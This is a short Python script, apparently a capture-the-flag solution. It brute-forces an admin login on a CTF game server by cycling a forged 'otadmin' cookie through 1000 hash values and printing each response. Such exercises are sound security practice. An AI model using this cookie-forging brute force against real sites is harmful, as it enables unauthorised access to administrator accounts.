import requests

url = "https://gameserver.zajebistyc.tf/admin/login.php"

for i in range(1000):
	cookies = {"otadmin": '{"hash": %03d}'%i}
	print cookies
	response = requests.get(url, cookies=cookies)
	print response.status_code
	print response.text
